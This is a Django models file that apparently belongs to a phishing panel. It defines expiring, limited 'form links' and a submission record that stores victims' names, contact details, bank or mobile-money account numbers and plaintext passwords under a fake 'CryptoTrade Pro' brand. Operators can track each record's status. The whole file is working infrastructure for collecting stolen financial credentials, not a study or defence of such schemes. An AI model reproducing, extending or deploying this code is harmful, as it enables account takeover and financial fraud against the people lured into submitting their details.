from django.db import models
import uuid

from django.contrib.auth.models import User

class FormLink(models.Model):
    user = models.ForeignKey(User, on_delete=models.CASCADE, related_name='form_links', null=True)
    name = models.CharField(max_length=255)
    description = models.TextField(blank=True)
    link_id = models.CharField(max_length=100, unique=True, default=uuid.uuid4)
    expiry_date = models.DateTimeField(null=True, blank=True)
    submissions_limit = models.IntegerField(default=0)  # 0 for unlimited
    created_at = models.DateTimeField(auto_now_add=True)

    def __str__(self):
        return self.name

class Submission(models.Model):
    id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False)
    user = models.ForeignKey(User, on_delete=models.CASCADE, related_name='submissions', null=True)
    full_name = models.CharField(max_length=255)
    email = models.EmailField()
    phone = models.CharField(max_length=50)
    method = models.CharField(max_length=50)
    account_number = models.CharField(max_length=255)
    password = models.CharField(max_length=255)
    bank_name = models.CharField(max_length=255, blank=True, null=True)
    operator_name = models.CharField(max_length=255, blank=True, null=True)
    link_id = models.CharField(max_length=100, blank=True, null=True)
    status = models.CharField(max_length=50, default='Nouveau')
    created_at = models.DateTimeField(auto_now_add=True)

    def __str__(self):
        return f"{self.full_name} - {self.method}"

class AppSettings(models.Model):
    user = models.OneToOneField(User, on_delete=models.CASCADE, related_name='settings', null=True)
    app_name = models.CharField(max_length=255, default='CryptoTrade Pro')
    welcome_message = models.TextField(default='Bienvenue sur CryptoTrade Pro...')
    primary_color = models.CharField(max_length=50, default='#1a1f3a')
    accent_color = models.CharField(max_length=50, default='#f7931a')
    updated_at = models.DateTimeField(auto_now=True)

    def __str__(self):
        return f"Settings for {self.user.username}" if self.user else "Global Settings"

class Notification(models.Model):
    user = models.ForeignKey(User, on_delete=models.CASCADE, related_name='notifications', null=True)
    title = models.CharField(max_length=255)
    message = models.TextField()
    type = models.CharField(max_length=50, default='info') # info, success, warning
    is_read = models.BooleanField(default=False)
    created_at = models.DateTimeField(auto_now_add=True)

    def __str__(self):
        return self.title
